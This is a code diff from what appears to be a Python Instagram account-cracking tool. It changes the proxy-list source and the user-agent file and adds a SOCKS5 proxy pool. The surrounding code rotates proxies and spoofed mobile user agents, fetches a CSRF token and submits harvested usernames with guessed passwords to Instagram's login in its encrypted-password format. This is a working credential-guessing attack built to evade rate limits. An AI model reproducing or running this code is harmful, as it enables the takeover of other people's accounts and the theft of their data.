@@ -360,7 +360,7 @@ def ___proxy3___():
         open('Data/proxy.txt', 'w').write(___roz)
     except Exception as e:
         ___proxy = open('Data/proxy3.txt', 'r').read()
-        ___roz = requests.get('https://raw.githubusercontent.com/MN4WN1-777/ignew/master/Data/proxy.txt').text
+        ___roz = requests.get('https://github.com/MN4WN1-777/ignew/blob/master/Data/proxy1.txt').text
         open('Data/proxy.txt', 'w').write(___roz)
     ___crack___()
 # Crack
@@ -410,7 +410,7 @@ class ___crack___:
             exit(f"{T}[{M}!{T}]{M} Crack is complete, there seems to be an error, please re-dump!")
     def __main__(self, user, uid, pwx):
         try:
-            ___useragent = open('Data/ua.txt', 'r').read()
+            ___useragent = open('Data/ua2.txt', 'r').read()
         except (IOError):
             ___ipaddress = requests.get('https://api.ipify.org').text
             ___useragent = random.choice('Mozilla/5.0 (Linux; Android 9; SM-A102U Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 Instagram 155.0.0.37.107 Android (28/9; 320dpi; 720x1468; samsung; SM-A102U; a10e; exynos7885; en_US; 239490550)',
@@ -425,6 +425,7 @@ class ___crack___:
                                              'Mozilla/5.0 (Linux; Android 9; TA-1024 Build/PKQ1.181105.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.121 Mobile Safari/537.36 Instagram 102.0.0.20.117 Android (28/9; 320dpi; 720x1280; HMD Global/Nokia; TA-1024; ND1; qcom; hu_HU; 163022084)')
                 ___ipaddress = requests.get('https://api.ipify.org').text
                 ___proxy = {'http': 'socks4://%s'%(random.choice(open("Data/proxy.txt","r").read().splitlines()))}
+                ___proxy3 = {'http': 'socks5://%s'%(random.choice(open("Data/proxy1.txt","r").read().splitlines()))}
                 ___csrf = requests.get(___url).cookies['csrftoken']
                 ___data = {'username': uid,
                 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pw}',
